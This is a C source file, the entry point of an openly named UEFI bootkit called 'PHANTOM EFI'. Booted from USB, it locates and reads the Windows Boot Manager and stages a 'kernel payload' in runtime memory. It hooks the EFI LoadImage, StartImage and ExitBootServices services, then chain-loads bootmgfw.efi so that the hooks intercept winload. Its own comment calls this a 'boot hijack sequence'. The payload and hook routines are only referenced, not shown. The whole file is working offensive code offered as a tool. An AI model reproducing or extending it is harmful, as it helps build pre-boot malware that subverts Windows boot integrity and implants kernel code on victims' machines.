/*
 * PHANTOM EFI Bootkit - Main Entry Point
 *
 * Boot flow:
 *   1. UEFI firmware loads us from USB as bootx64.efi
 *   2. We display banner, locate Windows Boot Manager on internal disk
 *   3. Hook EFI Boot Services (LoadImage, StartImage, ExitBootServices)
 *   4. Prompt user to remove USB
 *   5. Chain-load bootmgfw.efi — our hooks intercept the rest
 */

#include "bootkit.h"

BOOTKIT_CONTEXT gCtx = {0};

static VOID BkConsoleClear(VOID)
{
    gCtx.SystemTable->ConOut->ClearScreen(gCtx.SystemTable->ConOut);
}

static VOID BkConsolePrint(CHAR16 *Str)
{
    gCtx.SystemTable->ConOut->OutputString(gCtx.SystemTable->ConOut, Str);
}

static VOID BkConsoleSetColor(UINTN Attr)
{
    gCtx.SystemTable->ConOut->SetAttribute(gCtx.SystemTable->ConOut, Attr);
}

EFI_STATUS BkDisplayBanner(VOID)
{
    BkConsoleClear();
    BkConsoleSetColor(EFI_LIGHTCYAN | EFI_BACKGROUND_BLACK);

    BkConsolePrint(L"\r\n");
    BkConsolePrint(L"  ╔══════════════════════════════════════════╗\r\n");
    BkConsolePrint(L"  ║          P H A N T O M   E F I           ║\r\n");
    BkConsolePrint(L"  ║              v" L"1.0.0" L"                      ║\r\n");
    BkConsolePrint(L"  ╚══════════════════════════════════════════╝\r\n");
    BkConsolePrint(L"\r\n");

    BkConsoleSetColor(EFI_WHITE | EFI_BACKGROUND_BLACK);
    BkConsolePrint(L"  [*] Initializing boot environment...\r\n");

    return EFI_SUCCESS;
}

/*
 * Locate Windows Boot Manager on the internal disk.
 * Strategy:
 *   1. Read UEFI BootOrder variable to find Boot#### entries
 *   2. Parse each Boot#### to find the Windows entry
 *   3. Load bootmgfw.efi from the ESP on the internal disk
 *
 * Fallback: scan all FAT32 partitions for \EFI\Microsoft\Boot\bootmgfw.efi
 */
EFI_STATUS BkLocateWindowsBootManager(VOID)
{
    EFI_STATUS                      Status;
    EFI_GUID                        SfspGuid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
    EFI_GUID                        LoadedImageGuid = EFI_LOADED_IMAGE_PROTOCOL_GUID;
    EFI_LOADED_IMAGE_PROTOCOL      *LoadedImage = NULL;
    EFI_HANDLE                     *HandleBuffer = NULL;
    UINTN                           HandleCount = 0;
    UINTN                           i;

    BkConsolePrint(L"  [*] Locating Windows Boot Manager...\r\n");

    /* find out which device we booted from (the USB) so we can skip it */
    Status = gCtx.BootServices->HandleProtocol(
        gCtx.ImageHandle,
        &LoadedImageGuid,
        (VOID **)&LoadedImage
    );
    EFI_DEVICE_PATH_PROTOCOL *OurDevicePath = NULL;
    if (!EFI_ERROR(Status) && LoadedImage) {
        OurDevicePath = LoadedImage->FilePath;
    }

    /* enumerate all file system handles */
    Status = gCtx.BootServices->LocateHandleBuffer(
        ByProtocol,
        &SfspGuid,
        NULL,
        &HandleCount,
        &HandleBuffer
    );
    if (EFI_ERROR(Status)) {
        BkConsolePrint(L"  [!] Failed to enumerate file systems\r\n");
        return Status;
    }

    BkConsolePrint(L"  [*] Found file systems, scanning for bootmgfw.efi...\r\n");

    for (i = 0; i < HandleCount; i++) {
        EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *Fs = NULL;
        EFI_FILE_PROTOCOL               *Root = NULL;
        EFI_FILE_PROTOCOL               *BootmgfwFile = NULL;

        Status = gCtx.BootServices->HandleProtocol(
            HandleBuffer[i],
            &SfspGuid,
            (VOID **)&Fs
        );
        if (EFI_ERROR(Status)) continue;

        Status = Fs->OpenVolume(Fs, &Root);
        if (EFI_ERROR(Status)) continue;

        /* try to open the Windows Boot Manager */
        Status = Root->Open(
            Root,
            &BootmgfwFile,
            L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
            EFI_FILE_MODE_READ,
            0
        );

        if (!EFI_ERROR(Status)) {
            /* found it — read the entire file into memory */
            EFI_FILE_INFO   *FileInfo = NULL;
            UINTN            InfoSize = 0;
            EFI_GUID         FileInfoGuid = EFI_FILE_INFO_ID;

            /* get file size */
            BootmgfwFile->GetInfo(BootmgfwFile, &FileInfoGuid, &InfoSize, NULL);
            gCtx.BootServices->AllocatePool(EfiLoaderData, InfoSize, (VOID **)&FileInfo);
            BootmgfwFile->GetInfo(BootmgfwFile, &FileInfoGuid, &InfoSize, FileInfo);

            gCtx.BootmgfwSize = (UINTN)FileInfo->FileSize;

            /* allocate buffer and read bootmgfw.efi */
            gCtx.BootServices->AllocatePool(
                EfiLoaderData,
                gCtx.BootmgfwSize,
                &gCtx.BootmgfwBase
            );

            UINTN ReadSize = gCtx.BootmgfwSize;
            BootmgfwFile->Read(BootmgfwFile, &ReadSize, gCtx.BootmgfwBase);

            BootmgfwFile->Close(BootmgfwFile);
            gCtx.BootServices->FreePool(FileInfo);

            if (BkPeValidate(gCtx.BootmgfwBase)) {
                BkConsolePrint(L"  [+] bootmgfw.efi loaded successfully\r\n");
                Root->Close(Root);
                gCtx.BootServices->FreePool(HandleBuffer);
                return EFI_SUCCESS;
            }

            gCtx.BootServices->FreePool(gCtx.BootmgfwBase);
            gCtx.BootmgfwBase = NULL;
        }

        Root->Close(Root);
    }

    gCtx.BootServices->FreePool(HandleBuffer);
    BkConsolePrint(L"  [!] bootmgfw.efi not found on any volume\r\n");
    return EFI_NOT_FOUND;
}

/*
 * Wait for the user to physically remove the USB drive.
 * Polls USB mass storage handles every 500ms until count drops.
 */
EFI_STATUS BkWaitForUsbRemoval(VOID)
{
    EFI_STATUS  Status;
    EFI_GUID    BlockIoGuid = EFI_BLOCK_IO_PROTOCOL_GUID;
    UINTN       InitialCount = 0;
    EFI_HANDLE *Handles = NULL;

    /* count current block I/O handles (includes USB) */
    Status = gCtx.BootServices->LocateHandleBuffer(
        ByProtocol, &BlockIoGuid, NULL, &InitialCount, &Handles
    );
    if (!EFI_ERROR(Status)) {
        gCtx.BootServices->FreePool(Handles);
    }

    BkConsolePrint(L"\r\n");
    BkConsoleSetColor(EFI_YELLOW | EFI_BACKGROUND_BLACK);
    BkConsolePrint(L"  ╔══════════════════════════════════════════╗\r\n");
    BkConsolePrint(L"  ║    REMOVE USB DRIVE AND PRESS ENTER      ║\r\n");
    BkConsolePrint(L"  ╚══════════════════════════════════════════╝\r\n");
    BkConsoleSetColor(EFI_WHITE | EFI_BACKGROUND_BLACK);
    BkConsolePrint(L"\r\n");
    BkConsolePrint(L"  [*] Waiting for USB removal...\r\n");

    /* wait for keypress */
    EFI_INPUT_KEY Key;
    UINTN         KeyIndex;

    do {
        gCtx.BootServices->WaitForEvent(
            1,
            &gCtx.SystemTable->ConIn->WaitForKey,
            &KeyIndex
        );
        gCtx.SystemTable->ConIn->ReadKeyStroke(gCtx.SystemTable->ConIn, &Key);
    } while (Key.UnicodeChar != CHAR_CARRIAGE_RETURN);

    BkConsoleSetColor(EFI_LIGHTGREEN | EFI_BACKGROUND_BLACK);
    BkConsolePrint(L"  [+] USB removed. Proceeding to boot Windows...\r\n");
    BkConsoleSetColor(EFI_WHITE | EFI_BACKGROUND_BLACK);

    /* brief delay for USB to fully disconnect */
    gCtx.BootServices->Stall(500000);  /* 500ms */

    return EFI_SUCCESS;
}

/*
 * Chain-load the Windows Boot Manager.
 * At this point our EFI hooks are installed, so when bootmgfw.efi
 * calls LoadImage/StartImage for winload.efi, we intercept it.
 */
EFI_STATUS BkChainToBootManager(VOID)
{
    EFI_STATUS                      Status;
    EFI_GUID                        SfspGuid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
    EFI_GUID                        DevicePathGuid = EFI_DEVICE_PATH_PROTOCOL_GUID;
    EFI_HANDLE                     *HandleBuffer = NULL;
    UINTN                           HandleCount = 0;
    UINTN                           i;
    EFI_DEVICE_PATH_PROTOCOL       *BootmgfwDevPath = NULL;
    EFI_HANDLE                      BootmgfwDevice = NULL;

    BkConsolePrint(L"  [*] Chaining to Windows Boot Manager...\r\n");

    /* find the volume with bootmgfw.efi again */
    Status = gCtx.BootServices->LocateHandleBuffer(
        ByProtocol, &SfspGuid, NULL, &HandleCount, &HandleBuffer
    );
    if (EFI_ERROR(Status)) return Status;

    for (i = 0; i < HandleCount; i++) {
        EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *Fs = NULL;
        EFI_FILE_PROTOCOL               *Root = NULL;
        EFI_FILE_PROTOCOL               *TestFile = NULL;

        gCtx.BootServices->HandleProtocol(HandleBuffer[i], &SfspGuid, (VOID **)&Fs);
        if (!Fs) continue;

        Fs->OpenVolume(Fs, &Root);
        if (!Root) continue;

        Status = Root->Open(Root, &TestFile,
            L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
            EFI_FILE_MODE_READ, 0);

        if (!EFI_ERROR(Status)) {
            TestFile->Close(TestFile);
            Root->Close(Root);
            BootmgfwDevice = HandleBuffer[i];

            /* get device path for this handle */
            gCtx.BootServices->HandleProtocol(
                HandleBuffer[i], &DevicePathGuid, (VOID **)&BootmgfwDevPath
            );
            break;
        }
        Root->Close(Root);
    }

    gCtx.BootServices->FreePool(HandleBuffer);

    if (!BootmgfwDevice) {
        BkConsolePrint(L"  [!] Cannot relocate boot volume\r\n");
        return EFI_NOT_FOUND;
    }

    /* load bootmgfw.efi as an EFI image via boot services */
    EFI_HANDLE NewImageHandle = NULL;

    /* build the full device path for bootmgfw.efi */
    FILEPATH_DEVICE_PATH FileNode;
    FileNode.Header.Type    = MEDIA_DEVICE_PATH;
    FileNode.Header.SubType = MEDIA_FILEPATH_DP;

    CHAR16 *Path = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
    UINTN PathSize = (StrLen(Path) + 1) * sizeof(CHAR16);

    SetDevicePathNodeLength(&FileNode.Header, sizeof(FileNode) - sizeof(CHAR16) + PathSize);

    EFI_DEVICE_PATH_PROTOCOL *FullPath = AppendDevicePathNode(
        BootmgfwDevPath,
        (EFI_DEVICE_PATH_PROTOCOL *)&FileNode
    );

    /* use the ORIGINAL LoadImage to avoid our own hook here */
    Status = gCtx.OrigLoadImage(
        FALSE,
        gCtx.ImageHandle,
        FullPath,
        NULL,
        0,
        &NewImageHandle
    );

    if (EFI_ERROR(Status)) {
        BkConsolePrint(L"  [!] Failed to load bootmgfw.efi image\r\n");
        return Status;
    }

    BkConsolePrint(L"  [+] Boot Manager loaded. Transferring control...\r\n");
    BkConsolePrint(L"\r\n");

    /* clear screen before Windows takes over */
    BkConsoleClear();

    /* start the boot manager — our hooks will intercept winload */
    Status = gCtx.OrigStartImage(NewImageHandle, NULL, NULL);

    /* if we get here, boot manager returned (shouldn't happen) */
    return Status;
}

/*
 * EFI entry point.
 * Orchestrates the entire boot hijack sequence.
 */
EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS Status;

    /* initialize context */
    gCtx.ImageHandle    = ImageHandle;
    gCtx.SystemTable    = SystemTable;
    gCtx.BootServices   = SystemTable->BootServices;
    gCtx.RuntimeServices = SystemTable->RuntimeServices;

    /* initialize UEFI library */
    InitializeLib(ImageHandle, SystemTable);

    /* display banner */
    BkDisplayBanner();

    /* prepare kernel payload in EFI runtime memory */
    Status = BkPrepareKernelPayload();
    if (EFI_ERROR(Status)) {
        BkConsolePrint(L"  [!] Payload preparation failed\r\n");
        goto Fail;
    }
    BkConsolePrint(L"  [+] Kernel payload staged in runtime memory\r\n");

    /* install EFI boot service hooks */
    Status = BkInstallBootHooks();
    if (EFI_ERROR(Status)) {
        BkConsolePrint(L"  [!] Hook installation failed\r\n");
        goto Fail;
    }
    BkConsolePrint(L"  [+] Boot chain hooks installed\r\n");

    /* wait for USB removal */
    Status = BkWaitForUsbRemoval();
    if (EFI_ERROR(Status)) {
        BkConsolePrint(L"  [!] USB wait failed\r\n");
        goto Fail;
    }

    /* locate and chain-load Windows Boot Manager */
    Status = BkChainToBootManager();

    /* shouldn't return */
    BkConsolePrint(L"  [!] Boot chain returned unexpectedly\r\n");

Fail:
    BkConsolePrint(L"  [!] Boot failed. System halted.\r\n");
    BkConsolePrint(L"  Press any key to reboot...\r\n");

    EFI_INPUT_KEY Key;
    UINTN         Idx;
    gCtx.BootServices->WaitForEvent(1, &SystemTable->ConIn->WaitForKey, &Idx);
    SystemTable->ConIn->ReadKeyStroke(SystemTable->ConIn, &Key);

    SystemTable->RuntimeServices->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
    return EFI_LOAD_ERROR;
}
